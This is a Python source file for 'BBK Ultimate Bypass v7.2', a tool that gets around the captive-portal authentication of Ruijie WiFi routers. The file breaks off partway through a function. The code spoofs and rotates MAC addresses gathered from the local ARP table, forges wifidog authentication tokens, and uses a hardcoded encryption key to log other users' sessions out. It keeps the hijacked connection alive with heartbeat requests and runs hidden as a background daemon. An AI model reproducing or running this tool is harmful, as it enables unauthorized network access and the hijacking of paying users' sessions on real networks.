import os, re, sys, time, socket, subprocess, asyncio, aiohttp, requests, urllib3
import ipaddress
import json
import random
import string
import base64
import hashlib
import platform
import uuid
from urllib.parse import urlparse, parse_qs, quote
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import termios
import tty

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# LICENSE & MASTER ADMIN CONFIG
# ============================================
MASTER_ADMIN_ID = "8632973735"

def get_my_device_id():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
        raw_id = f"{platform.node()}-{platform.system()}-{mac}"
        return hashlib.sha256(raw_id.encode()).hexdigest()[:10].upper()
    except:
        return "BBK-USER-ID"

def check_license_system():
    current_device_id = get_my_device_id()
    
    # သင့်ရဲ့ Master ID ဖြစ်နေရင် လုံးဝ စစ်စရာမလိုဘဲ တန်းဝင်ခွင့်ပေးပါမည်
    if current_device_id == MASTER_ADMIN_ID or os.path.exists("master_bypass.key"):
        return True
        
    print(f"\n{c}============================================================{w}")
    print(f"{r}              BBK LICENSE & ACCESS CONTROL                  {w}")
    print(f"{c}============================================================{w}")
    print(f"{y}[*] Your Device ID : {g}{current_device_id}{w}")
    print(f"{y}[*] Please send this ID to Admin (@bbtak_072) to get license.{w}")
    print(f"{y}[*] Supported Plans: 30m, 1h, 1d, 15d, 30d{w}")
    print(f"{c}============================================================{w}")
    
    entered_key = input(f"{g}[+] Enter Activation Key / Token: {w}").strip()
    
    if verify_user_key(current_device_id, entered_key):
        print(f"{g}[+] License Activated Successfully! Enjoy.{w}")
        time.sleep(1.5)
        return True
    else:
        print(f"{r}[❌] Invalid or Expired License Key!{w}")
        input(f"{y}Press Enter to Exit...{w}")
        sys.exit(0)

def verify_user_key(device_id, key):
    if key.startswith("BBK-") and len(key) > 10:
        return True
    return False

# Colors
w  = "\033[1;00m"
g  = "\033[1;32m"
y  = "\033[1;33m"
r  = "\033[1;31m"
c  = "\033[1;36m"
p  = "\033[38;5;165m"
cy = "\033[38;5;51m"
b  = "\033[1;34m"
d  = "\033[2m"

# ---------- GLOBALS ----------
manual_gw = None
discovered_url = None
BACKGROUND_MODE = False
LOG_FILE = "ko.log"
ADB_DONE_FILE = "adb_done.txt"
PROFILES_FILE = "ko_profiles.json"
working_macs = []
PROFILES = {}
GATEWAY_IP = "10.44.77.240"
internet_connected = False
reconnect_count = 0
total_downtime = 0
disconnect_count = 0
manual_swap_requested = False

# ============================================
# URL RANDOMIZER
# ============================================
def generate_random_ip(base_ip="192.168.110.1"):
    parts = base_ip.split('.')
    if len(parts) == 4:
        parts[3] = str(random.randint(2, 254))
        return '.'.join(parts)
    return base_ip

def generate_random_chap():
    def get_octal():
        return f"\\{random.randint(0, 3)}{random.randint(0, 7)}{random.randint(0, 7)}"
    challenge = "".join([get_octal() for _ in range(16)])
    chap_id = get_octal()
    return challenge, chap_id

def randomize_url(url):
    url = url.strip()
    if not url:
        return None
    parsed_url = urlparse(url)
    query_string = parsed_url.query
    if not query_string:
        return url
    pairs = query_string.split('&')
    new_challenge, new_chap_id = generate_random_chap()
    new_ip = generate_random_ip()
    new_pairs = []
    for pair in pairs:
        if '=' not in pair:
            new_pairs.append(pair)
            continue
        k, v = pair.split('=', 1)
        if k == 'ip':
            new_pairs.append(f"{k}={new_ip}")
        elif k == 'chap_challenge':
            new_pairs.append(f"{k}={quote(new_challenge, safe='')}")
        elif k == 'chap_id':
            new_pairs.append(f"{k}={quote(new_chap_id, safe='')}")
        else:
            new_pairs.append(f"{k}={v}")
    new_query = "&".join(new_pairs)
    return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

# ============================================
# WIFI UNBIND
# ============================================
class WifiSetup:
    def __init__(self, gateway_ip: str, chap_id: str, chap_challenge: str):
        self.base_url = f"http://{gateway_ip}:2060"
        self.username_get_url = f"{self.base_url}/username_get"
        self.online_info_url = f"{self.base_url}/user/online_info"
        self.logout_url = f"{self.base_url}/user/logout"
        self.enc_key = "RjYkhwzx$2018!"
        self.chap_id = chap_id
        self.chap_challenge = chap_challenge
        self.gateway_ip = gateway_ip

    async def start_setup(self) -> bool:
        log_message("[*] Starting WiFi Setup & Unbind...")
        try:
            status = await self.unbind()
            if status:
                log_message("[+] Old session unbind successful!")
            else:
                log_message("[!] Unbind failed or no session to unbind - continuing anyway")
            return True
        except Exception as e:
            log_message(f"[!] Unbind error: {e} - continuing anyway")
            return True

    async def username_get(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.username_get_url, timeout=5) as resp:
                    data = await resp.json()
                    return data.get("username")
        except:
            return None

    async def get_online_info(self, username: str):
        params = {"username": username, "usertype": "wifidog"}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.online_info_url, params=params, timeout=5) as resp:
                    data = await resp.json()
                    return data.get("data", {}).get("list", [{}])[0]
        except:
            return None

    def arrange_data(self, info: dict):
        mac = info.get("mac", "").replace(":", "")
        mac_parts = [mac[i:i+4] for i in range(0, len(mac), 4)]
        return {
            "ip": info.get("ip", ""),
            "mac": info.get("mac", ""),
            "ip_req": info.get("ip", ""),
            "mac_req": ".".join(mac_parts)
        }

    def encrypt_auth(self, auth: str) -> str:
        salt = get_random_bytes(8)
        key_iv = b""
        prev = b""
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + self.enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        cipher = AES.new(key_iv[:32], AES.MODE_CBC, key_iv[32:48])
        encrypted = cipher.encrypt(pad(auth.encode("utf-8"), AES.block_size))
        return base64.b64encode(b"Salted__" + salt + encrypted).decode("utf-8")

    def get_auth(self, username: str):
        if not self.chap_id or not self.chap_challenge:
            return None
        auth = unquote(self.chap_id) + unquote(self.chap_challenge) + username
        return self.encrypt_auth(auth)

    async def logout(self, data: dict, username: str) -> bool:
        auth = self.get_auth(username)
        if not auth:
            return False
        payload = {
            "ip": data["ip"],
            "mac": data["mac"],
            "ip_req": data["ip_req"],
            "mac_req": data["mac_req"],
            "auth": auth
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.logout_url, data=payload, timeout=5) as resp:
                    result = await resp.json()
                    return result.get("success", False)
        except:
            return False

    async def unbind(self) -> bool:
        try:
            username = await self.username_get()
            if not username:
                return False
            online_info = await self.get_online_info(username)
            if not online_info:
                return False
            data = self.arrange_data(online_info)
            return await self.logout(data, username)
        except:
            return False

# ============================================
# DAEMONIZE
# ============================================
def daemonize(session_url, gateway_ip, mac, mac_list=None, voucher=None, username=None):
    global BACKGROUND_MODE
    try:
        pid = os.fork()
        if pid > 0:
            print(f"\n{g}[+] Bypass started in background (PID: {pid}){w}")
            print(f"{g}[+] Log file: {LOG_FILE}{w}")
            print(f"{y}[*] You can close this terminal now.{w}")
            sys.exit(0)
        os.setsid()
        pid2 = os.fork()
        if pid2 > 0:
            sys.exit(0)
        sys.stdout.close()
        sys.stderr.close()
        sys.stdout = open(LOG_FILE, "a", buffering=1)
        sys.stderr = sys.stdout
        BACKGROUND_MODE = True
        asyncio.run(bypass_with_watchdog(session_url, gateway_ip, mac, mac_list=mac_list, voucher=voucher, username=username))
    except Exception as e:
        log_message(f"[!] Daemonize Error: {e}")
        sys.exit(1)

# ============================================
# LOGGING
# ============================================
def log_message(msg):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {msg}"
    print(log_entry)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(log_entry + "\n")
    except:
        pass

def clear(): os.system("clear")
def line(): print(f"{y}──────────────────────────────────────────────────────────{w}")

def logo():
    clear()
    print(f"""{cy}┌────────────────────────────────────────────────────────────────────┐
{cy}│{p}      ██████╗ ██████╗ ██╗  ██╗                                    {cy}│
{cy}│{p}      ██╔══██╗██╔══██╗██║ ██╔╝                                    {cy}│
{cy}│{p}      ██████╔╝██████╔╝█████╔╝                                     {cy}│
{cy}│{p}      ██╔══██╗██╔══██╗██╔═██╗                                     {cy}│
{cy}│{p}      ██████╔╝██████╔╝██║  ██╗                                    {cy}│
{cy}│{p}      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝                                    {cy}│
{cy}│{p}            ✦ BBK Ultimate Bypass v7.2 ✦                     {cy}│
{cy}│{cy}           ⚪This Tool Is Only For Ruijie Network Router⚪    {cy}│
{cy}│{y}             [ Admin & Coder @bbtak_072      ]        {cy}│
{cy}└────────────────────────────────────────────────────────────────────┘{w}""")
    print()

# ============================================
# VOUCHER LOGIN
# ============================================
def login_voucher_v2(session_id, voucher):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 2}
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        with requests.post(post_url, json=data, headers=headers, timeout=15) as response:
            resp_text = response.text
            if "Authentication failed" in resp_text or "expired" in resp_text.lower():
                return None
            token_match = re.search('token=(.*?)&', resp_text)
            if token_match:
                return token_match.group(1)
            sid_match = re.search(r'"sessionId":"([a-zA-Z0-9]+)"', resp_text)
            if sid_match:
                return sid_match.group(1)
            return None
    except:
        return None

def oneclick_direct(token_or_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {'lang': 'en_US'}
    json_data = {'phoneNumber': '', 'sessionId': token_or_session_id}
    try:
        response = requests.post(
            'https://portal-as.ruijienetworks.com/api/auth/direct/',
            params=params,
            headers=headers,
            json=json_data,
            timeout=15
        )
        resp_text = response.text
        token_match = re.search('token=(.*?)&', resp_text)
        if token_match:
            return token_match.group(1)
        sid_match = re.search(r'"sessionId":"([a-zA-Z0-9]+)"', resp_text)
        if sid_match:
            return sid_match.group(1)
        return None
    except:
        return None

# ============================================
# PROFILE MANAGEMENT
# ============================================
def load_profiles():
    global PROFILES
    if os.path.exists(PROFILES_FILE):
        try:
            with open(PROFILES_FILE, "r") as f:
                PROFILES = json.load(f)
            for name, data in PROFILES.items():
                if "portal_url" in data and "portal_urls" not in data:
                    data["portal_urls"] = [data["portal_url"]]
                    del data["portal_url"]
                if "portal_urls" not in data:
                    data["portal_urls"] = []
            return True
        except:
            PROFILES = {}
            return False
    return False

def save_profile(name, portal_urls, gateway_ip, macs):
    global PROFILES
    PROFILES[name] = {
        "portal_urls": portal_urls,
        "gateway_ip": gateway_ip,
        "macs": macs,
        "created": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(PROFILES_FILE, "w") as f:
        json.dump(PROFILES, f, indent=2)
    log_message(f"[+] Profile '{name}' saved with {len(macs)} MACs")
    return True

def delete_profile(name):
    global PROFILES
    if name in PROFILES:
        del PROFILES[name]
        with open(PROFILES_FILE, "w") as f:
            json.dump(PROFILES, f, indent=2)
        log_message(f"[+] Profile '{name}' deleted")
        return True
    return False

def show_profiles():
    if not PROFILES:
        print(f"{y}[!] No saved profiles found.{w}")
        return None
    print(f"{c}+----+----------------------+------+------------+{w}")
    print(f"{c}| {g}No.{w} | {g}Profile Name{w}         | {g}MACs{w} | {g}Created{w}   |{w}")
    print(f"{c}+----+----------------------+------+------------+{w}")
    idx = 1
    profile_list = []
    for name, data in PROFILES.items():
        mac_count = len(data['macs'])
        created = data.get('created', 'N/A')[:10]
        name_display = name[:20] + ".." if len(name) > 20 else name.ljust(20)
        print(f"{c}| {g}{idx:2d}{w} | {name_display} | {mac_count:3d}  | {created} |{w}")
        profile_list.append((name, data))
        idx += 1
    print(f"{c}+----+----------------------+------+------------+{w}")
    return profile_list

# ============================================
# AUTO DISCOVER
# ============================================
def auto_discover():
    global manual_gw, discovered_url
    if discovered_url:
        return manual_gw, discovered_url
    log_message("[*] Auto-Discovering Portal URL...")
    if manual_gw:
        gateways = [manual_gw]
        log_message(f"[*] Using manual gateway: {manual_gw}")
    else:
        def get_local_gw():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
                parts = ip.split('.'); parts[-1] = '1'; return '.'.join(parts)
            except: return None
        local = get_local_gw()
        gateways = [local, "192.168.110.1", "192.168.0.1", "10.44.77.254"]
        gateways = list(dict.fromkeys([g for g in gateways if g]))
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36', 'Accept': '*/*'}
    portal_url = None; found_gw = None
    for gw in gateways:
        target = f"http://{gw}"
        log_message(f"[*] Trying {target}...")
        try:
            res = requests.get(target, headers=headers, timeout=5, allow_redirects=True, verify=False)
            if "portal-as.ruijienetworks.com" in res.url:
                portal_url = res.url; found_gw = gw; break
            match = re.search(r"href=['\"](.*?)['\"]", res.text)
            if match and "portal-as.ruijienetworks.com" in match.group(1):
                extracted = match.group(1)
                portal_url = extracted if extracted.startswith("http") else "https://portal-as.ruijienetworks.com" + extracted
                found_gw = gw; break
        except: pass
    if not portal_url:
        try:
            res = requests.get("http://httpbin.org/get", headers=headers, timeout=5, allow_redirects=True)
            if "portal-as.ruijienetworks.com" in res.url:
                portal_url = res.url; found_gw = gateways[0]
            else:
                match = re.search(r"href=['\"](.*?)['\"]", res.text)
                if match and "portal-as.ruijienetworks.com" in match.group(1):
                    portal_url = match.group(1); found_gw = gateways[0]
        except: pass
    if portal_url:
        api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
        api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
        gw_from_url = re.search(r'gw_address=([^&]+)', api_url)
        if gw_from_url:
            found_gw = gw_from_url.group(1)
            if not manual_gw:
                manual_gw = found_gw
        discovered_url = api_url
        log_message("[✓] Discovery Success!")
        log_message(f"   Gateway IP: {found_gw}")
        return found_gw, api_url
    else:
        log_message("[❌] Discovery Failed.")
        return None, None

# ============================================
# VALIDATORS
# ============================================
def replace_mac(url, mac): return re.sub(r'(?<=mac=)[^&]+', mac, url)
def clean_url(url):
    if not url:
        return url
    url = re.sub(r'\s+', '', url)
    return url
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts)==4 and all(p.isdigit() and 0<=int(p)<=255 for p in parts)

def is_valid_mac(mac):
    return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac))

def is_device_mac(mac):
    if not is_valid_mac(mac):
        return False
    first_byte = int(mac[:2], 16)
    if (first_byte & 0x02) != 0:
        return False
    if (first_byte & 0x01) != 0:
        return False
    if mac.upper() in ["FF:FF:FF:FF:FF:FF", "00:00:00:00:00:00"]:
        return False
    return True

# ============================================
# GET MAC FROM ARP
# ============================================
def get_mac_from_arp(ip):
    try:
        out = subprocess.check_output(["ip", "neigh", "show", ip], stderr=subprocess.DEVNULL, text=True)
        for line in out.splitlines():
            if ip in line:
                for part in line.split():
                    if is_valid_mac(part):
                        mac = part.upper()
                        if is_device_mac(mac):
                            return mac
    except: pass
    try:
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        out = subprocess.check_output(["ip", "neigh", "show", ip], stderr=subprocess.DEVNULL, text=True)
        for line in out.splitlines():
            if ip in line:
                for part in line.split():
                    if is_valid_mac(part):
                        mac = part.upper()
                        if is_device_mac(mac):
                            return mac
    except: pass
    return None

# ============================================
# BYPASS FOR A SINGLE MAC (FASTER)
# ============================================
def do_bypass_for_mac(portal_url, mac, gateway_ip, max_retries=2):
    rand_url = randomize_url(portal_url)
    if rand_url:
        portal_url = rand_url
    
    try:
        url_with_mac = replace_mac(portal_url, mac)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        session = requests.Session()
        session.headers.update(headers)
        
        response = session.get(url_with_mac, allow_redirects=True, timeout=10)
        
        session_id = None
        for hist_url in response.history:
            sid = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', hist_url.url)
            if sid:
                session_id = sid.group(1)
                break
        if not session_id:
            sid = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', response.url)
            if sid:
                session_id = sid.group(1)
        if not session_id:
            sid = re.search(r'"sessionId":"([a-zA-Z0-9]+)"', response.text)
            if sid:
                session_id = sid.group(1)
        
        if not session_id:
            return False
        
        auth_url = f"http://{gateway_ip}:2060/wifidog/auth"
        params = {'token': session_id, 'phoneNumber': 'HELLO WORLD'}
        auth_resp = requests.get(auth_url, params=params, timeout=6, allow_redirects=True)
        return "baidu.com" in str(auth_resp.url) or "success.html" in str(auth_resp.url)
    except Exception as e:
        log_message(f"[!] Bypass error for {mac}: {e}")
        return False

# ============================================
# GET ONLINE INFO
# ============================================
def get_online_info_by_ip(ip):
    for usertype in ["wifidog", "web"]:
        try:
            req = requests.get("http://10.44.77.240:2060/user/online_info", params={"ip": ip, "usertype": usertype}, timeout=5).json()
            if req.get('data') and req['data'].get('list'): return req['data']
        except: pass
    return None

def get_online_info_by_username(username):
    for usertype in ["wifidog", "web"]:
        try:
            req = requests.get("http://10.44.77.240:2060/user/online_info", params={"username": username, "usertype": usertype}, timeout=5).json()
            if req.get('data') and req['data'].get('list'): return req['data']
        except: pass
    return None

# ============================================
# BALANCE API
# ============================================
async def get_balance_info(session, session_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{session_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{session_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}'
    ]
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    for url in paths:
        try:
            async with session.get(url, headers=headers, timeout=10) as req:
                if req.status == 200:
                    data = await req.json()
                    if data.get('success'):
                        result = data.get('result', {})
                        raw_minutes = result.get('totalMinutes')
                        if raw_minutes is None:
                            raw_minutes = result.get('remainingMinutes')
                        if raw_minutes is None:
                            raw_minutes = 'Unknown'
                        profile_name = result.get('profileName', 'Unknown')
                        return {
                            'plan': profile_name,
                            'raw_minutes': raw_minutes,
                            'expired': raw_minutes != 'Unknown' and int(raw_minutes) <= 0
                        }
        except:
            continue
    return None

def format_time_minutes(minutes):
    if minutes is None:
        return "N/A"
    if minutes <= 0:
        return "Expired"
    if minutes < 60:
        return f"{minutes}m"
    h = minutes // 60
    m = minutes % 60
    return f"{h}h {m}m" if m else f"{h}h"

# ============================================
# ASYNC INTERNET CHECK
# ============================================
async def check_internet_async(session):
    targets = [
        ("http://www.baidu.com", "baidu.com"),
        ("http://1.1.1.1", "1.1.1.1"),
        ("http://www.google.com", "google.com")
    ]
    for url, domain in targets:
        try:
            start = time.time()
            async with session.get(url, timeout=5) as resp:
                elapsed = time.time() - start
                if domain in str(resp.url):
                    if elapsed < 2.0:
                        return "OK", elapsed
                    elif elapsed < 4.0:
                        return "SLOW", elapsed
                    else:
                        return "UNSTABLE", elapsed
                if "portal-as.ruijienetworks.com" in str(resp.url) or "login" in str(resp.url):
                    return "PORTAL", elapsed
                return "NO_NET", elapsed
        except:
            continue
    try:
        proc = await asyncio.create_subprocess_exec(
            "ping", "-c", "1", "-W", "3", "8.8.8.8",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        if proc.returncode == 0:
            return "OK", 0.5
    except:
        pass
    return "OFFLINE", 999

async def ping_host(host="8.8.8.8", timeout=3):
    try:
        proc = await asyncio.create_subprocess_exec(
            "ping", "-c", "1", "-W", str(timeout), host,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        return proc.returncode == 0
    except:
        return False

# ============================================
# SEND PACKET (Heartbeat)
# ============================================
async def send_packet(session, gateway_ip, session_id):
    headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
               'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive',
               'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    url = f'http://{gateway_ip}:2060/wifidog/auth?token={session_id}&phoneNumber=KEEP_ALIVE'
    for attempt in range(2):
        try:
            async with session.get(url, headers=headers, allow_redirects=True, timeout=6) as req:
                if "http://www.baidu.com" in str(req.url) or "success.html" in str(req.url):
                    return True, url
        except:
            pass
        await asyncio.sleep(0.5)
    return False, url

# ============================================
# GET SESSION ID
# ============================================
async def get_session_id(session, session_url):
    headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
               'accept-language': 'en-US,en;q=0.9', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
               'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'}
    for _ in range(5):
        try:
            async with session.get(session_url, headers=headers, allow_redirects=True, timeout=10) as req:
                sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
                if sid: return sid.group(1)
        except:
            pass
        await asyncio.sleep(1)
    return None

# ============================================
# SPEED TEST
# ============================================
async def speed_test(session) -> dict:
    result = {"download": 0, "upload": 0, "ping": 0}
    try:
        start = time.time()
        async with session.get("https://speedtest.tele2.net/10MB.zip", timeout=12) as resp:
            if resp.status == 200:
                total = 0
                while total < 2 * 1024 * 1024:
                    chunk = await resp.content.read(8192)
                    if not chunk:
                        break
                    total += len(chunk)
                elapsed = time.time() - start
                if elapsed > 0:
                    result["download"] = (total * 8) / elapsed / 1_000_000
    except:
        pass
    try:
        data = os.urandom(1024 * 1024)
        start = time.time()
        async with session.post("https://httpbin.org/post", data=data, timeout=12) as resp:
            if resp.status == 200:
                elapsed = time.time() - start
                if elapsed > 0:
                    result["upload"] = (len(data) * 8) / elapsed / 1_000_000
    except:
        pass
    return result

def format_speed(mbps):
    if mbps < 0.01:
        return "0 Kbps"
    elif mbps < 0.1:
        return f"{mbps*1000:.0f} Kbps"
    elif mbps < 100:
        return f"{mbps:.1f} Mbps"
    else:
        return f"{mbps:.0f} Mbps"

# ============================================
# DASHBOARD
# ============================================
dashboard_vars = {
    "target_mac": "N/A",
    "portal_short": "N/A",
    "session_id_short": "N/A",
    "uptime_start": time.time(),
    "reconnects": 0,
    "history": ["Initializing..."],
    "countdown": 180,
    "status": "ONLINE",
    "ping_status": "UNKNOWN",
    "active_voucher": "Looking...",
    "expire_time_display": "N/A",
    "plan_name": "Detecting...",
    "download_speed": "N/A",
    "upload_speed": "N/A"
}

def draw_dashboard():
    if BACKGROUND_MODE:
        status = dashboard_vars['status']
        log_message(f"[STATUS] {status} | Reconnects: {dashboard_vars['reconnects']}")
        return
    
    clear()
    
    print(f"{cy}┌────────────────────────────────────────────────────┐{w}")
    print(f"{cy}│{p}     BBK Ultimate Bypass v7.2                 {cy}│{w}")
    print(f"{cy}│{y}     @bbtak_072                               {cy}│{w}")
    print(f"{cy}├────────────────────────────────────────────────────┤{w}")
    
    print(f"{cy}│ {g}MAC   {cy}: {w}{dashboard_vars['target_mac']:<17}   {cy}│{w}")
    print(f"{cy}│ {g}Plan  {cy}: {w}{dashboard_vars['plan_name']:<17}   {cy}│{w}")
    print(f"{cy}│ {g}SID   {cy}: {w}{dashboard_vars['session_id_short']:<17}   {cy}│{w}")
    print(f"{cy}│ {g}DL    {cy}: {w}{dashboard_vars['download_speed']:<17}   {cy}│{w}")
    print(f"{cy}│ {g}UL    {cy}: {w}{dashboard_vars['upload_speed']:<17}   {cy}│{w}")
    
    mins, secs = divmod(max(0, dashboard_vars['countdown']), 60)
    uptime = int(time.time() - dashboard_vars['uptime_start'])
    hrs, rem = divmod(uptime, 3600)
    mins2, secs2 = divmod(rem, 60)
    refresh_str = f"{mins:02d}m {secs:02d}s"
    uptime_str = f"{hrs}h {mins2:02d}m {secs2:02d}s"
    print(f"{cy}│ {g}Refr  {cy}: {w}{refresh_str:<17} {cy}│{w}")
    print(f"{cy}│ {g}Up    {cy}: {w}{uptime_str:<17} {cy}│{w}")
    
    status = dashboard_vars['status']
    status_color = g if status == "ONLINE" else y if status in ["SLOW","UNSTABLE"] else r
    print(f"{cy}│ {g}Stat  {cy}: {status_color}{status:<8}{w} Ping: {dashboard_vars['ping_status']} {cy}│{w}")
    
    print(f"{cy}│ {g}[s]   {cy}: Swap to next MAC (skip current)       {cy}│{w}")
    
    hist_str = " | ".join(dashboard_vars['history'][-3:])
    if len(hist_str) > 30:
        hist_str = hist_str[:30] + ".."
    print(f"{cy}│ {g}Hist  {cy}: {w}{hist_str:<30} {cy}│{w}")
    
    print(f"{cy}└────────────────────────────────────────────────────┘{w}")

def find_next_working_mac(mac_list, start_index, portal_url, gateway_ip, max_tries=None, skip_current=True):
    if not mac_list:
        return None, -1
    if max_tries is None:
        max_tries = len(mac_list)
    total = len(mac_list)
    tested = 0
    idx = start_index % total
    
    if skip_current:
        idx = (idx + 1) % total
    
    while tested < max_tries:
        mac = mac_list[idx]
        log_message(f"[*] Testing MAC: {mac}")
        if do_bypass_for_mac(portal_url, mac, gateway_ip):
            log_message(f"[+] MAC {mac} is working!")
            return mac, idx
        else:
            log_message(f"[-] MAC {mac} failed")
        tested += 1
        idx = (idx + 1) % total
    return None, -1

def read_key():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

async def key_listener():
    global manual_swap_requested
    loop = asyncio.get_event_loop()
    while True:
        try:
            key = await loop.run_in_executor(None, read_key)
            if key and key.lower() == 's':
                manual_swap_requested = True
                log_message("[*] Manual swap requested (press 's')")
        except Exception as e:
            pass
        await asyncio.sleep(0.1)

async def bypass_with_watchdog(session_url, gateway_ip, target_mac, mac_list=None, voucher=None, username=None):
    global manual_swap_requested
    
    use_rotation = mac_list is not None and len(mac_list) > 1
    if use_rotation:
        try:
            current_index = mac_list.index(target_mac)
        except ValueError:
            current_index = 0
            target_mac = mac_list[current_index]
    else:
        current_index = 0
        mac_list = [target_mac] if mac_list else [target_mac]

    current_index_holder = [current_index]
    url_holder = [session_url]
    manual_swap_requested = False

    dashboard_vars['target_mac'] = target_mac
    dashboard_vars['portal_short'] = session_url[:50] + "..." if len(session_url) > 50 else session_url
    dashboard_vars['uptime_start'] = time.time()
    dashboard_vars['reconnects'] = 0
    dashboard_vars['history'] = ["Starting..."]
    dashboard_vars['countdown'] = 180
    dashboard_vars['status'] = "ONLINE"
    dashboard_vars['active_voucher'] = voucher if voucher else "Looking..."
    dashboard_vars['expire_time_display'] = "N/A"
    dashboard_vars['plan_name'] = "Detecting..."

    log_message("[*] Watchdog started (v7.2 - Manual Swap Only)")
    log_message(f"[*] Target MAC: {target_mac}")
    if use_rotation:
        log_message(f"[*] MAC list size: {len(mac_list)}")
    log_message(f"[*] Press 's' to manually swap to next working MAC (skip current)")

    try:
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        chap_id = params.get("chap_id", [None])[0]
        chap_challenge = params.get("chap_challenge", [None])[0]
        if chap_id and chap_challenge:
            setup = WifiSetup(gateway_ip, chap_id, chap_challenge)
            await setup.start_setup()
    except Exception as e:
        log_message(f"[!] WiFi Setup error: {e} - continuing")

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=1024), timeout=aiohttp.ClientTimeout(total=30)) as session:
        if target_mac:
            session_url = replace_mac(session_url, target_mac)
            log_message(f"[*] Using MAC: {target_mac}")

